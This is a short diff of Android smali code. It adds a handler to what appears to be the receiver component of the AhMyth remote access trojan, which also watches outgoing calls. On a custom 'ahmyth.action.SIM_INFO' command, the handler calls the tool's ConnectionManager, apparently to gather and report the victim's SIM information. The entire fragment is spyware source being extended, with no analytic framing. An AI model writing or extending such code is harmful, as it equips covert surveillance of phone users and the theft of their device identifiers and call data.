@@ -44,6 +44,21 @@
 
     move-result-object v0
 
+    const-string v1, "ahmyth.action.SIM_INFO"
+
+    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_sim_info
+
+    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000si()V
+
+    :cond_sim_info
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v0
+
     const-string v1, "android.intent.action.NEW_OUTGOING_CALL"
 
     invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
